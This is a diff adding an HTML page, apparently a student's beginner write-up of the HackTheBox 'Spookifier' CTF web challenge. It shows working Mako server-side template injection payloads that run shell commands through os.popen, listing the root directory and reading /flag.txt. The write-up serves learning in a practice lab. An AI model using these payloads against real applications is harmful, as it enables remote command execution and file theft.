@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB Spookifier</title>
+  <style>
+    :root {
+      --bg: #0d0f17;
+      --surface: #13151c;
+      --text: #a0a8b8;
+      --accent: #7aa2f7;
+      --border: #24283b;
+      --cyan: #7dcfff;
+      --green: #9ece6a;
+      --yellow: #e0af68;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Cascadia Code", "Fira Mono", Consolas, monospace;
+      background: var(--bg);
+      color: var(--text);
+      font-size: 14px;
+      line-height: 1.55;
+      min-height: 100vh;
+    }
+
+    .bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 4px 12px;
+      display: flex;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .bar span { color: var(--accent); }
+
+    .wrap {
+      max-width: 960px;
+      margin: auto;
+      padding: 2rem 1rem;
+    }
+
+    .prompt { color: var(--green); }
+    .cmd    { color: var(--yellow); }
+
+    img {
+      max-width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+
+    h1, h2, h3 {
+      color: var(--accent);
+      margin-top: 1.5rem;
+      margin-bottom: .5rem;
+    }
+    h1 { font-size: 1.4rem; }
+    h2 { font-size: 1.2rem; }
+    h3 { font-size: 1.05rem; }
+
+    code {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 2px 4px;
+      border-radius: 3px;
+      color: var(--yellow);
+      font-size: 13px;
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .75rem 1rem;
+      overflow-x: auto;
+      margin: .5rem 0;
+    }
+
+    ul {
+      margin-left: 1.2rem;
+      margin-top: .5rem;
+    }
+    li { margin-bottom: .25rem; }
+
+    .tags {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .5rem .75rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      margin: 1rem 0;
+    }
+    .tag {
+      background: var(--accent);
+      color: var(--bg);
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      color: var(--cyan);
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span>user@htb</span>
+    <span>~/spookifier</span>
+  </div>
+
+  <main class="wrap">
+    <h1>HTB Challenge: Spookifier (Beginner Write-up)</h1>
+
+    <div class="tags">
+      <span class="tag">HTB</span>
+      <span class="tag">CTF</span>
+    </div>
+
+    <p>
+      In this post, I’ll go over the <strong class="cmd">HackTheBox challenge Spookifier</strong>.<br>
+      It’s a web challenge, and I’ll explain step by step how I solved it as a first-year uni student.
+    </p>
+
+    <h2>Step 1: Explore the Web App</h2>
+    <p>After starting the challenge, I opened the website.<br>
+    It’s called <strong class="cmd">Spookifier</strong> and it asks you to enter your “Halloween name.”</p>
+    <img src="1st.png" alt="1st">
+    <p>When I typed my name, it showed the result in four different fonts.</p>
+    <img src="2nd.png" alt="2nd">
+    <p>At first, I thought it might be an <strong class="cmd">XSS</strong> challenge, but there wasn’t any admin bar or cookie stealing option. I also noticed there was a file I could download, so I grabbed it to check inside.</p>
+
+    <h2>Step 2: Inspect the Source Code</h2>
+    <p>The file turned out to be a <strong class="cmd">Flask application</strong>. I opened it with:</p>
+    <pre><code>cat main.py</code></pre>
+    <p>The interesting part was that it used <strong class="cmd">Mako Templates</strong>. That immediately made me think of <strong class="cmd">Server-Side Template Injection (SSTI)</strong>.</p>
+    <img src="3rd.png" alt="3rd">
+
+    <h2>Step 3: Test for SSTI</h2>
+    <p>First, I tried a common SSTI payload:</p>
+    <pre><code>{{7*7}}</code></pre>
+    <p>Nothing happened. Then I remembered that for Mako, the syntax is different, so I used:</p>
+    <pre><code>${7 * 7}</code></pre>
+    <p>And yes! It returned <strong class="cmd">49</strong>.</p>
+    <img src="4th.png" alt="4th">
+
+    <h2>Step 4: Run Commands</h2>
+    <p>I looked up some Mako payloads on PayloadsAllTheThings and tried this:</p>
+    <pre><code>${self.module.cache.util.os.system("id")}</code></pre>
+    <p>But it only returned <strong class="cmd">0</strong>. That’s because <code>system</code> runs the command but doesn’t return the output.</p>
+    <img src="5th.png" alt="5th">
+    <p>To actually see the output, I switched to <code>popen().read()</code>:</p>
+    <pre><code>${self.module.cache.util.os.popen("id").read()}</code></pre>
+    <p>This time, it worked and printed my user info.</p>
+    <img src="6th.png" alt="6th">
+
+    <h2>Step 5: Find and Read the Flag</h2>
+    <p>Next, I checked the root directory:</p>
+    <pre><code>${self.module.cache.util.os.popen("ls /").read()}</code></pre>
+    <p>I saw <strong class="cmd">flag.txt</strong> inside.</p>
+    <img src="7th.png" alt="7th">
+    <p>Finally, I read the flag with:</p>
+    <pre><code>${self.module.cache.util.os.popen("cat /flag.txt").read()}</code></pre>
+    <p>And boom 🎉 I got the flag!</p>
+    <img src="8th.png" alt="8th">
+
+    <h2>Conclusion</h2>
+    <p>This was a really fun SSTI challenge. Here’s what I learned:</p>
+    <ul>
+      <li>Always check source code if it’s provided.</li>
+      <li>Mako uses <code>${ }</code> instead of <code>{{ }}</code> for templates.</li>
+      <li><code>os.system</code> executes but doesn’t show output — <code>os.popen().read()</code> does.</li>
+      <li>Use <code>ls</code> to locate files and <code>cat</code> to read them.</li>
+    </ul>
+    <p class="cmd">✅ Flag Captured!</p>
+  </main>
+
+  <footer>
+    <span>EOF ── happy hacking :)</span>
+  </footer>
+</body>
+</html>
